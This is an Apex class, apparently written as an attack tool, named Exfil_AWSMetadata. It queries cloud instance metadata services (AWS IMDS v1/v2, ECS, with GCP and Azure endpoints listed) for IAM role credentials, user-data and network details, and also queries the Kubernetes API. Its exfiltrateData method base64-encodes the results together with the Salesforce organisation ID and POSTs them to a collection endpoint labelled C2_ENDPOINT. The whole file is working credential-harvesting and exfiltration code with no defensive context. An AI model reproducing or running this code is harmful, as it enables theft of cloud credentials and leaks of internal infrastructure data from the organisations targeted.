public class Exfil_AWSMetadata {
    private static final String AWS_METADATA_V1 = 'http://169.254.169.254/latest/meta-data/';
    private static final String AWS_METADATA_V2 = 'http://169.254.169.254/latest/api/token';
    private static final String AWS_CREDS_PATH = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    private static final String AWS_USERDATA = 'http://169.254.169.254/latest/user-data';
    private static final String ECS_METADATA = 'http://169.254.170.2/v2/credentials';
    private static final String EKS_METADATA = 'https://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance';
    private static final String GCP_METADATA = 'http://metadata.google.internal/computeMetadata/v1/';
    private static final String AZURE_METADATA = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';

    private static final String C2_ENDPOINT = 'https://localhost:8080/collect';

    public static void harvestAWSCredentials() {
        Http http = new Http();

        HttpRequest tokenReq = new HttpRequest();
        tokenReq.setEndpoint(AWS_METADATA_V2);
        tokenReq.setMethod('PUT');
        tokenReq.setHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
        HttpResponse tokenResp = http.send(tokenReq);
        String imdsToken = tokenResp.getBody();

        HttpRequest credsReq = new HttpRequest();
        credsReq.setEndpoint(AWS_CREDS_PATH);
        credsReq.setMethod('GET');
        credsReq.setHeader('X-aws-ec2-metadata-token', imdsToken);
        HttpResponse credsResp = http.send(credsReq);
        String roleName = credsResp.getBody().trim();

        HttpRequest roleCredsReq = new HttpRequest();
        roleCredsReq.setEndpoint(AWS_CREDS_PATH + roleName);
        roleCredsReq.setMethod('GET');
        roleCredsReq.setHeader('X-aws-ec2-metadata-token', imdsToken);
        HttpResponse roleCredsResp = http.send(roleCredsReq);

        exfiltrateData('aws_creds', roleCredsResp.getBody());
    }

    public static void harvestAllCloudMetadata() {
        Map<String, String> endpoints = new Map<String, String>{
            'aws_instance' => AWS_METADATA_V1 + 'instance-id',
            'aws_hostname' => AWS_METADATA_V1 + 'hostname',
            'aws_security_groups' => AWS_METADATA_V1 + 'security-groups',
            'aws_vpc' => AWS_METADATA_V1 + 'network/interfaces/macs/',
            'aws_userdata' => AWS_USERDATA,
            'ecs_creds' => ECS_METADATA
        };

        Http http = new Http();
        String exfilPayload = '';

        for (String key : endpoints.keySet()) {
            try {
                HttpRequest req = new HttpRequest();
                req.setEndpoint(endpoints.get(key));
                req.setMethod('GET');
                req.setTimeout(5000);
                HttpResponse resp = http.send(req);
                exfilPayload += key + '=' + EncodingUtil.base64Encode(Blob.valueOf(resp.getBody())) + '&';
            } catch (Exception e) {
                continue;
            }
        }

        exfiltrateData('cloud_metadata', exfilPayload);
    }

    public static void harvestEKSToken() {
        Http http = new Http();
        HttpRequest req = new HttpRequest();
        req.setEndpoint('https://kubernetes.default.svc/api/v1/namespaces');
        req.setMethod('GET');
        req.setTimeout(5000);
        HttpResponse resp = http.send(req);
        exfiltrateData('k8s_namespaces', resp.getBody());
    }

    private static void exfiltrateData(String dataType, String data) {
        Http http = new Http();
        HttpRequest req = new HttpRequest();
        req.setEndpoint(C2_ENDPOINT);
        req.setMethod('POST');
        req.setHeader('Content-Type', 'application/json');
        req.setBody(JSON.serialize(new Map<String, String>{
            'type' => dataType,
            'org' => UserInfo.getOrganizationId(),
            'data' => EncodingUtil.base64Encode(Blob.valueOf(data)),
            'timestamp' => String.valueOf(Datetime.now())
        }));
        http.send(req);
    }
}
